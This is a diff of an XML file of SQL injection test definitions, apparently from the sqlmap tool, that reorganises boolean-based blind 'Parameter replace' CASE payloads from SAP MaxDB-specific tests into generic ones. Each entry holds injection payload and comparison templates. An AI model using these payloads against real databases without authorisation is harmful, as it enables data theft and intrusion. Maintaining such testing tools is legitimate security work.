@@ -879,44 +879,6 @@ Tag: <test>
         </details>
     </test>
 
-    <test>
-        <title>SAP MaxDB boolean-based blind - Parameter replace</title>
-        <stype>1</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>1,3</clause>
-        <where>3</where>
-        <vector>(CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE NULL END)</vector>
-        <request>
-            <payload>(CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE NULL END)</payload>
-        </request>
-        <response>
-            <comparison>(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [RANDNUM] ELSE NULL END)</comparison>
-        </response>
-        <details>
-            <dbms>SAP MaxDB</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>SAP MaxDB boolean-based blind - Parameter replace (original value)</title>
-        <stype>1</stype>
-        <level>4</level>
-        <risk>1</risk>
-        <clause>1,3</clause>
-        <where>3</where>
-        <vector>(CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE NULL END)</vector>
-        <request>
-            <payload>(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)</payload>
-        </request>
-        <response>
-            <comparison>(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [ORIGVALUE] ELSE NULL END)</comparison>
-        </response>
-        <details>
-            <dbms>SAP MaxDB</dbms>
-        </details>
-    </test>
-
     <!-- Works in MySQL, Oracle, etc. -->
     <test>
         <title>Boolean-based blind - Parameter replace (DUAL)</title>
@@ -947,6 +909,40 @@ Tag: <test>
         </request>
         <response>
             <comparison>(CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)</comparison>
+        </response>
+    </test>
+    <!-- End of boolean-based blind tests - Parameter replace -->
+
+    <!-- Works in SAP MaxDB, Informix, etc. -->
+    <test>
+        <title>Boolean-based blind - Parameter replace (CASE)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE NULL END)</vector>
+        <request>
+            <payload>(CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE NULL END)</payload>
+        </request>
+        <response>
+            <comparison>(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [RANDNUM] ELSE NULL END)</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>Boolean-based blind - Parameter replace (CASE) (original value)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE NULL END)</vector>
+        <request>
+            <payload>(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)</payload>
+        </request>
+        <response>
+            <comparison>(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [ORIGVALUE] ELSE NULL END)</comparison>
         </response>
     </test>
     <!-- End of boolean-based blind tests - Parameter replace -->
